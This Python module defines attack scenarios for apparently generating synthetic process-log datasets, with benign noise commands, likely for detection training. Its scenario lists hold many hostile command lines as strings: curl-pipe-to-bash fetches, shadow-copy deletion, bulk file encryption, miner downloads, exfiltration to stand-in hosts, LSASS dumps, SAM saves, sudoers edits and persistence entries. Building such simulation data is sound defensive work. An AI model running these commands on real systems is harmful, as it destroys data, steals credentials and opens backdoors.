"""Preset scenario definitions and mock command templates (process-level only).

Each scenario carries ordered malicious "beats" (the attack story) per OS plus a
narrative. A shared benign pool supplies realistic noise. Pure-Python so the LLM
phase can later replace generator.generate_dataset without touching UI/API.
"""

from typing import Dict, List


def _c(p: str, c: str) -> Dict[str, str]:
    return {"process_name": p, "command_line": c}


SCENARIO_META = [
    {"id": "ransomware", "name": "Ransomware", "icon": "🔒",
     "description": "Encrypt files, kill backups, drop a ransom note.", "color": "#ef4444"},
    {"id": "crypto_miner", "name": "Crypto Miner", "icon": "⛏️",
     "description": "Fetch a miner, pin the CPU, persist quietly.", "color": "#f59e0b"},
    {"id": "lateral_movement", "name": "Lateral Movement", "icon": "↔️",
     "description": "Spread to other hosts via remote execution.", "color": "#8b5cf6"},
    {"id": "data_exfiltration", "name": "Data Exfiltration", "icon": "📤",
     "description": "Stage, compress and smuggle out sensitive data.", "color": "#3b82f6"},
    {"id": "privilege_escalation", "name": "Privilege Escalation", "icon": "⬆️",
     "description": "Abuse misconfigs to gain admin / root.", "color": "#10b981"},
    {"id": "credential_dumping", "name": "Credential Dumping", "icon": "🔑",
     "description": "Harvest secrets from memory, registry and files.", "color": "#ec4899"},
    {"id": "persistence", "name": "Persistence / Backdoor", "icon": "🚪",
     "description": "Plant a scheduled task / service for re-entry.", "color": "#06b6d4"},
]

NAME: Dict[str, str] = {m["id"]: m["name"] for m in SCENARIO_META}

STORY: Dict[str, str] = {
    "ransomware": "Initial access lands a hidden PowerShell loader. The actor destroys recovery options (shadow copies, backup catalog, recovery boot config), stops database and backup services, then encrypts user documents in bulk. Persistence is set via a logon scheduled task and a Run key, and a ransom note is dropped.",
    "crypto_miner": "A hidden downloader pulls a miner binary and stages it under a trustworthy-looking path. The miner runs against a mining pool, persistence is set via a scheduled task / Run key, power-saving is disabled to maximise hashrate, and the process is niced down to stay quiet.",
    "lateral_movement": "After landing, the actor enumerates the domain and file shares, copies a payload to a remote host, and executes it remotely via service creation, scheduled task, WMI and PsExec — pivoting across workstations.",
    "data_exfiltration": "Sensitive finance files are collected from shares into a staging folder, archived and encoded to blend with normal output, then split and moved out. Staging artifacts are cleaned up afterward.",
    "privilege_escalation": "The actor profiles the host for misconfigurations (unquoted service paths, weak permissions, stored tokens), abuses a writable service or scheduled task running as SYSTEM/root, and confirms elevated context.",
    "credential_dumping": "Credential stores are harvested: LSASS memory, the SAM/SECURITY hives, browser/credential vaults and SSH keys — then copied out for offline cracking.",
    "persistence": "Multiple re-entry footholds are planted: a SYSTEM scheduled task, an autostart Run key, a malicious service, and a startup script — so access survives reboots and cleanup.",
}

BEATS: Dict[str, Dict[str, List[Dict[str, str]]]] = {
    "ransomware": {
        "windows": [
            _c("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
            _c("vssadmin.exe", "vssadmin delete shadows /all /quiet"),
            _c("wbadmin.exe", "wbadmin delete catalog -quiet"),
            _c("bcdedit.exe", "bcdedit /set {default} recoveryenabled No"),
            _c("net.exe", "net stop \"Veeam Backup Service\" /y"),
            _c("taskkill.exe", "taskkill /F /IM sqlservr.exe /T"),
            _c("powershell.exe", "powershell -c \"Get-ChildItem C:\\Users -Recurse -Include *.docx,*.xlsx | % { .\\enc.exe $_.FullName }\""),
            _c("schtasks.exe", "schtasks /create /tn Updater /tr C:\\ProgramData\\svc.exe /sc onlogon /ru SYSTEM /f"),
            _c("reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\svc.exe /f"),
            _c("notepad.exe", "notepad C:\\Users\\Public\\READ_ME_TO_DECRYPT.txt"),
        ],
        "linux": [
            _c("bash", "bash -c 'curl -s http://stage/enc.sh | bash'"),
            _c("systemctl", "systemctl stop mariadb postgresql"),
            _c("find", "find /home -type f -name '*.docx' -exec openssl enc -aes-256-cbc -in {} -out {}.locked \\;"),
            _c("rm", "rm -rf /var/backups/*"),
            _c("crontab", "(crontab -l; echo '@reboot /usr/local/bin/.svc') | crontab -"),
            _c("bash", "bash -c 'echo DECRYPT INSTRUCTIONS > /root/READ_ME.txt'"),
        ],
    },
    "crypto_miner": {
        "windows": [
            _c("powershell.exe", "powershell -nop -w hidden -c \"iwr http://pool.cdn/x.bin -OutFile $env:TEMP\\svchost.exe\""),
            _c("cmd.exe", "cmd /c move %TEMP%\\svchost.exe C:\\ProgramData\\Intel\\svchost.exe"),
            _c("svchost.exe", "C:\\ProgramData\\Intel\\svchost.exe --algo rx/0 -o pool.minexmr.com:443 -u 4xWALLET --tls"),
            _c("schtasks.exe", "schtasks /create /tn IntelGfx /tr C:\\ProgramData\\Intel\\svchost.exe /sc onstart /ru SYSTEM /f"),
            _c("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v IntelGfx /d C:\\ProgramData\\Intel\\svchost.exe /f"),
            _c("powercfg.exe", "powercfg /change standby-timeout-ac 0"),
        ],
        "linux": [
            _c("curl", "curl -fsSL http://pool.cdn/xmrig -o /tmp/.x"),
            _c("chmod", "chmod +x /tmp/.x"),
            _c("nohup", "nohup /tmp/.x -o pool.minexmr.com:443 -u 4xWALLET --tls >/dev/null 2>&1 &"),
            _c("crontab", "(crontab -l; echo '*/10 * * * * /tmp/.x') | crontab -"),
            _c("renice", "renice -n 19 -p $(pgrep .x)"),
        ],
    },
    "lateral_movement": {
        "windows": [
            _c("net.exe", "net view /domain"),
            _c("nltest.exe", "nltest /dclist:corp"),
            _c("cmd.exe", "cmd /c dir \\\\FS01\\C$\\Users"),
            _c("sc.exe", "sc \\\\WS-042 create svc binPath= \"cmd /c C:\\Windows\\Temp\\p.exe\" start= auto"),
            _c("wmic.exe", "wmic /node:WS-042 process call create \"cmd /c C:\\Windows\\Temp\\p.exe\""),
            _c("powershell.exe", "powershell -c \"Invoke-Command -ComputerName WS-042 -ScriptBlock { whoami }\""),
            _c("psexec.exe", "psexec \\\\WS-042 -s -d C:\\Windows\\Temp\\p.exe"),
        ],
        "linux": [
            _c("ssh", "ssh -o StrictHostKeyChecking=no svc@10.0.0.42 'id'"),
            _c("scp", "scp /tmp/p svc@10.0.0.42:/tmp/p"),
            _c("ssh", "ssh svc@10.0.0.42 'chmod +x /tmp/p && /tmp/p &'"),
            _c("ansible", "ansible all -i /tmp/hosts -m shell -a '/tmp/p'"),
        ],
    },
    "data_exfiltration": {
        "windows": [
            _c("cmd.exe", "cmd /c robocopy \\\\FS01\\Finance C:\\Windows\\Temp\\stage *.xlsx /S"),
            _c("tar.exe", "tar -cf C:\\Windows\\Temp\\out.tar C:\\Windows\\Temp\\stage"),
            _c("certutil.exe", "certutil -encode C:\\Windows\\Temp\\out.tar C:\\Windows\\Temp\\out.b64"),
            _c("powershell.exe", "powershell -c \"Compress-Archive C:\\Windows\\Temp\\stage C:\\Windows\\Temp\\f.zip\""),
            _c("bitsadmin.exe", "bitsadmin /transfer j /upload http://drop/f C:\\Windows\\Temp\\f.zip"),
            _c("cmd.exe", "cmd /c del /q C:\\Windows\\Temp\\stage\\*"),
        ],
        "linux": [
            _c("tar", "tar -czf /tmp/out.tgz /srv/finance"),
            _c("split", "split -b 5m /tmp/out.tgz /tmp/p_"),
            _c("base64", "base64 /tmp/out.tgz > /tmp/out.b64"),
            _c("scp", "scp /tmp/out.tgz drop@203.0.113.9:/in/"),
            _c("rm", "rm -f /tmp/out.tgz /tmp/p_*"),
        ],
    },
    "privilege_escalation": {
        "windows": [
            _c("whoami.exe", "whoami /priv"),
            _c("sc.exe", "sc qc Spooler"),
            _c("icacls.exe", "icacls \"C:\\Program Files\\Svc\\svc.exe\""),
            _c("cmd.exe", "cmd /c copy p.exe \"C:\\Program Files\\Svc\\svc.exe\" /Y"),
            _c("sc.exe", "sc stop Svc & sc start Svc"),
            _c("reg.exe", "reg add HKLM\\System\\CurrentControlSet\\Services\\Svc /v ImagePath /d C:\\Windows\\Temp\\p.exe /f"),
        ],
        "linux": [
            _c("sudo", "sudo -l"),
            _c("find", "find / -perm -4000 -type f 2>/dev/null"),
            _c("bash", "bash -c 'echo \"svc ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers.d/svc'"),
            _c("chmod", "chmod u+s /tmp/sh"),
            _c("sudo", "sudo install -m 4755 /bin/bash /tmp/rootbash"),
        ],
    },
    "credential_dumping": {
        "windows": [
            _c("rundll32.exe", "rundll32 comsvcs.dll, MiniDump 612 C:\\Windows\\Temp\\l.dmp full"),
            _c("reg.exe", "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.sav"),
            _c("reg.exe", "reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.sav"),
            _c("vaultcmd.exe", "vaultcmd /listcreds:\"Windows Credentials\" /all"),
            _c("powershell.exe", "powershell -c \"Get-ChildItem -Recurse -Filter *.kdbx C:\\Users\""),
            _c("cmdkey.exe", "cmdkey /list"),
        ],
        "linux": [
            _c("cat", "cat /etc/shadow"),
            _c("cp", "cp -r /home/svc/.ssh /tmp/.k"),
            _c("grep", "grep -ri password /var/www /etc 2>/dev/null"),
            _c("gcore", "gcore -o /tmp/d $(pgrep ssh-agent)"),
            _c("find", "find / -name id_rsa 2>/dev/null"),
        ],
    },
    "persistence": {
        "windows": [
            _c("schtasks.exe", "schtasks /create /tn OneDriveSync /tr C:\\Users\\Public\\od.exe /sc onlogon /ru SYSTEM /f"),
            _c("reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDrive /d C:\\Users\\Public\\od.exe /f"),
            _c("sc.exe", "sc create OneSync binPath= C:\\Users\\Public\\od.exe start= auto"),
            _c("powershell.exe", "powershell -c \"Copy-Item od.exe $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""),
            _c("wmic.exe", "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=upd"),
        ],
        "linux": [
            _c("crontab", "(crontab -l; echo '@reboot /usr/local/bin/.od') | crontab -"),
            _c("systemctl", "systemctl enable --now od.service"),
            _c("bash", "bash -c 'echo /usr/local/bin/.od >> ~/.bashrc'"),
            _c("ln", "ln -sf /usr/local/bin/.od /etc/init.d/od"),
        ],
    },
}

# Variation suffixes used to expand beats up to exactly 20 without literal copies.
HOSTS = ["WS-042", "WS-118", "FS01", "DC01", "APP-07", "WS-203", "HR-12", "WS-077"]
IPS = ["10.0.0.42", "10.0.0.51", "10.0.1.13", "10.0.2.9", "192.168.7.20"]


# ---------------------------------------------------------------------------
# Benign noise pool. Realistic admin/dev/user activity. The generator samples
# and lightly varies these (repo/service/file tokens) to reach ~200 rows.
# ---------------------------------------------------------------------------

BENIGN: Dict[str, List[Dict[str, str]]] = {
    "windows": [
        _c("git.exe", "git pull origin main"),
        _c("git.exe", "git commit -m \"fix: handle null user in {svc}\""),
        _c("git.exe", "git push origin feature/{repo}"),
        _c("git.exe", "git status"),
        _c("npm.cmd", "npm install"),
        _c("npm.cmd", "npm run build"),
        _c("node.exe", "node server.js"),
        _c("python.exe", "python -m pytest tests/"),
        _c("python.exe", "python manage.py migrate"),
        _c("pip.exe", "pip install -r requirements.txt"),
        _c("code.exe", "code C:\\Users\\{user}\\src\\{repo}"),
        _c("docker.exe", "docker ps -a"),
        _c("docker.exe", "docker compose up -d"),
        _c("docker.exe", "docker build -t {repo}:latest ."),
        _c("kubectl.exe", "kubectl get pods -n default"),
        _c("kubectl.exe", "kubectl logs deploy/{svc}"),
        _c("powershell.exe", "powershell -c \"Get-Process | Sort CPU -Desc | Select -First 10\""),
        _c("powershell.exe", "powershell -c \"Get-Service | Where Status -eq Running\""),
        _c("powershell.exe", "powershell -c \"Test-Connection {host}\""),
        _c("tasklist.exe", "tasklist /svc"),
        _c("ipconfig.exe", "ipconfig /all"),
        _c("net.exe", "net use Z: \\\\FS01\\Shared"),
        _c("sfc.exe", "sfc /scannow"),
        _c("chrome.exe", "chrome --profile-directory=Default"),
        _c("outlook.exe", "outlook.exe /recycle"),
        _c("teams.exe", "teams.exe --process-start-args"),
        _c("excel.exe", "excel.exe C:\\Users\\{user}\\Reports\\{repo}.xlsx"),
        _c("msbuild.exe", "msbuild {repo}.sln /p:Configuration=Release"),
        _c("dotnet.exe", "dotnet build -c Release"),
        _c("dotnet.exe", "dotnet test"),
        _c("java.exe", "java -jar C:\\apps\\{svc}.jar"),
        _c("psql.exe", "psql -h localhost -U app -d {svc} -c \"SELECT count(*) FROM users\""),
        _c("ssh.exe", "ssh {user}@{host}"),
        _c("curl.exe", "curl -s https://api.internal/{svc}/health"),
        _c("where.exe", "where python"),
        _c("ping.exe", "ping {host}"),
        _c("robocopy.exe", "robocopy C:\\src\\{repo} D:\\backup\\{repo} /MIR"),
        _c("explorer.exe", "explorer.exe C:\\Users\\{user}\\Downloads"),
    ],
    "linux": [
        _c("git", "git pull origin main"),
        _c("git", "git commit -am \"chore: bump {svc} deps\""),
        _c("git", "git log --oneline -5"),
        _c("npm", "npm ci"),
        _c("node", "node dist/server.js"),
        _c("python3", "python3 -m pytest -q"),
        _c("python3", "python3 manage.py runserver"),
        _c("pip3", "pip3 install -r requirements.txt"),
        _c("docker", "docker ps"),
        _c("docker", "docker compose -f {repo}/docker-compose.yml up -d"),
        _c("kubectl", "kubectl get pods -A"),
        _c("kubectl", "kubectl rollout restart deploy/{svc}"),
        _c("systemctl", "systemctl status {svc}"),
        _c("journalctl", "journalctl -u {svc} --since '1 hour ago'"),
        _c("ssh", "ssh {user}@{host}"),
        _c("scp", "scp ./{repo}.tar.gz {user}@{host}:/tmp/"),
        _c("curl", "curl -s http://localhost:8080/{svc}/health"),
        _c("apt", "apt list --upgradable"),
        _c("ps", "ps aux --sort=-%cpu | head"),
        _c("df", "df -h"),
        _c("free", "free -m"),
        _c("top", "top -bn1 | head"),
        _c("grep", "grep -r TODO ./{repo}/src"),
        _c("tar", "tar -czf /backup/{repo}.tgz ./{repo}"),
        _c("vim", "vim {repo}/config.yaml"),
        _c("make", "make build"),
        _c("go", "go test ./..."),
        _c("psql", "psql -U app -d {svc} -c \"SELECT now()\""),
        _c("rsync", "rsync -a ./{repo}/ {user}@{host}:/srv/{repo}/"),
        _c("ls", "ls -la /var/log"),
        _c("cat", "cat /etc/os-release"),
        _c("chmod", "chmod +x ./scripts/deploy.sh"),
        _c("ping", "ping -c 4 {host}"),
        _c("htop", "htop"),
    ],
}

REPOS = ["billing-api", "auth-svc", "web-frontend", "data-pipeline", "infra", "reports", "checkout", "notifications"]
SVCS = ["nginx", "postgres", "billing", "auth", "redis", "worker", "api", "scheduler"]
USERS = ["jdoe", "asmith", "mkhan", "rlee", "svc-deploy", "tchen"]

